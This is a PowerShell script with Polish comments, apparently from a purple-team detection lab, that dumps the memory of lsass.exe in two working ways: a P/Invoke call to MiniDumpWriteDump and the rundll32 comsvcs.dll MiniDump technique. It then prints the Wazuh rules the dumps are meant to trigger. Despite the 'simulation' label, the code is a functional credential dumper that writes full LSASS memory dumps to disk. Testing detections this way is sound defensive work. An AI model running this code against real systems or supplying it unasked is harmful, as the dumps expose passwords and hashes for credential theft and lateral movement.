<#
.SYNOPSIS
    Atak 02 — Symulacja Mimikatza (dump pamięci LSASS).

.DESCRIPTION
    Symuluje zachowanie credential-dumpera bez używania oryginalnego
    Mimikatza (zablokowałby go Defender, a my chcemy czyste testy detekcji).

    Tworzy te same wskaźniki telemetryczne, na których opierają się
    nasze reguły Wazuh / Sigma:
      - Sysmon EID 10 (ProcessAccess do lsass.exe z GrantedAccess 0x1410)
      - Sysmon EID 11 (FileCreate .dmp w katalogu tymczasowym)
      - Sysmon EID 1  (rundll32.exe wywoływany z comsvcs.dll / MiniDump)

.NOTES
    MITRE ATT&CK:
      - T1003.001 — OS Credential Dumping: LSASS Memory
      - T1218.011 — System Binary Proxy Execution: Rundll32 (wariant 2)

    Uruchomienie:
      powershell -ExecutionPolicy Bypass -File 02-mimikatz-simulation.ps1
#>

[CmdletBinding()]
param(
    [string] $DumpDir = "C:\Windows\Temp",
    [switch] $SkipApiMethod,
    [switch] $SkipComsvcsMethod
)

$ErrorActionPreference = "Continue"

# -----------------------------------------------------------------------------
# Banner
# -----------------------------------------------------------------------------
Write-Host @"

   ╔══════════════════════════════════════════════════════════╗
   ║   Attack 02 — LSASS Credential Dump Simulation           ║
   ║   MITRE: T1003.001 (LSASS Memory) + T1218.011 (rundll32) ║
   ╚══════════════════════════════════════════════════════════╝

"@ -ForegroundColor Yellow

# -----------------------------------------------------------------------------
# Pre-check: musimy być Administratorem
# -----------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] `
            [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] Skrypt wymaga uprawnień Administratora — LSASS jest chroniony przed dostępem zwykłych userów." -ForegroundColor Red
    Write-Host "    Uruchom PowerShell jako Administrator i spróbuj ponownie." -ForegroundColor Red
    exit 1
}

# -----------------------------------------------------------------------------
# Znajdź PID procesu lsass.exe
# -----------------------------------------------------------------------------
$lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
if (-not $lsass) {
    Write-Host "[!] Nie znaleziono procesu lsass.exe — to nie powinno się zdarzyć na Windowsie." -ForegroundColor Red
    exit 1
}

$lsassPid = $lsass.Id
Write-Host "[+] Znaleziono lsass.exe — PID = $lsassPid" -ForegroundColor Green

# -----------------------------------------------------------------------------
# METODA 1 — bezpośrednie wywołanie MiniDumpWriteDump przez P/Invoke
#            (dokładnie to robi Mimikatz w funkcji `sekurlsa::minidump`)
# -----------------------------------------------------------------------------
if (-not $SkipApiMethod) {
    Write-Host "`n[*] METODA 1 — MiniDumpWriteDump via P/Invoke" -ForegroundColor Cyan

    $dumpFile1 = Join-Path $DumpDir "lsass.dmp"

    # P/Invoke dla MiniDumpWriteDump z dbghelp.dll
    $pinvoke = @"
using System;
using System.Runtime.InteropServices;

public class Dumper {
    [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump",
               CallingConvention = CallingConvention.StdCall,
               CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint processId,
        IntPtr hFile,
        uint dumpType,
        IntPtr expParam,
        IntPtr userStreamParam,
        IntPtr callbackParam);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

    try {
        # Add-Type rzuca, jeśli typ 'Dumper' już istnieje (drugie uruchomienie w tej samej sesji)
        if (-not ('Dumper' -as [type])) {
            Add-Type -TypeDefinition $pinvoke -ErrorAction Stop
        }

        # PROCESS_QUERY_INFORMATION (0x0400) | PROCESS_VM_READ (0x0010) = 0x0410
        # (Mimikatz w nowszych wersjach używa 0x1410 — dodaje PROCESS_QUERY_LIMITED_INFORMATION)
        $hProc = [Dumper]::OpenProcess(0x1410, $false, $lsassPid)
        if ($hProc -eq [IntPtr]::Zero) {
            throw "OpenProcess failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        }
        Write-Host "    [+] OpenProcess OK — handle = $hProc (GrantedAccess = 0x1410)"

        $fs = [System.IO.File]::Create($dumpFile1)
        $hFile = $fs.SafeFileHandle.DangerousGetHandle()

        Write-Host "    [*] Wywołuję MiniDumpWriteDump (dumpType=2 — MiniDumpWithFullMemory)..."
        $ok = [Dumper]::MiniDumpWriteDump($hProc, $lsassPid, $hFile, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)

        $fs.Close()
        [Dumper]::CloseHandle($hProc) | Out-Null

        if ($ok) {
            $sz = (Get-Item $dumpFile1).Length / 1MB
            Write-Host "    [+] Dump zapisany: $dumpFile1 ($([Math]::Round($sz, 1)) MB)" -ForegroundColor Green
        } else {
            Write-Host "    [!] MiniDumpWriteDump zwrócił FALSE — błąd $([Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "    [!] Wyjątek: $_" -ForegroundColor Red
    }
}

# -----------------------------------------------------------------------------
# METODA 2 — LOLBAS: rundll32.exe + comsvcs.dll, MiniDump
#            Klasyk obecny w cheatsheetach od 2018 r. Wciąż działa.
# -----------------------------------------------------------------------------
if (-not $SkipComsvcsMethod) {
    Write-Host "`n[*] METODA 2 — rundll32.exe + comsvcs.dll MiniDump (LOLBAS)" -ForegroundColor Cyan

    $dumpFile2 = Join-Path $DumpDir "lsass2.dmp"

    # Komenda dokładnie taka, jak w cheatsheecie SwiftOnSecurity:
    # rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> <PATH> full
    # UWAGA: nie używamy nazwy $args — to automatyczna zmienna PowerShell.
    $cmd     = "C:\Windows\System32\rundll32.exe"
    $cmdArgs = "C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid $dumpFile2 full"

    Write-Host "    [*] Uruchamiam: $cmd $cmdArgs"
    try {
        # Uruchamiamy z cmd.exe, żeby był naturalny parent → child:
        $proc = Start-Process -FilePath "cmd.exe" `
                              -ArgumentList "/c $cmd $cmdArgs" `
                              -PassThru -Wait -WindowStyle Hidden
        Start-Sleep -Seconds 2
        if (Test-Path $dumpFile2) {
            $sz = (Get-Item $dumpFile2).Length / 1MB
            Write-Host "    [+] Dump zapisany: $dumpFile2 ($([Math]::Round($sz, 1)) MB)" -ForegroundColor Green
        } else {
            Write-Host "    [!] Plik $dumpFile2 nie powstał — Defender mógł zablokować." -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "    [!] Błąd: $_" -ForegroundColor Red
    }
}

# -----------------------------------------------------------------------------
# Podsumowanie + co powinien zobaczyć analityk
# -----------------------------------------------------------------------------
Write-Host "`n[+] Atak zakończony.`n" -ForegroundColor Green

Write-Host "Spodziewane alerty w Wazuh:"        -ForegroundColor Yellow
Write-Host "    - Rule 100210 (level 14): Possible LSASS memory access (Mimikatz-like)"
Write-Host "      → wyzwala się przez Sysmon EID 10 z TargetImage=lsass.exe, GrantedAccess=0x1410"
Write-Host "    - Rule 100211 (level 13): LSASS dump via comsvcs.dll (LOLBAS)"
Write-Host "      → wyzwala się przez Sysmon EID 1 z CommandLine zawierającym 'comsvcs' i 'MiniDump'"
Write-Host ""
Write-Host "MITRE ATT&CK technique: T1003.001 (LSASS Memory)" -ForegroundColor Yellow
Write-Host "Sprawdź dashboard: https://192.168.10.10  →  Discover  →  rule.id:100210 OR rule.id:100211"
Write-Host ""
Write-Host "Cleanup (opcjonalnie):"
Write-Host "    Remove-Item $DumpDir\lsass*.dmp -Force"
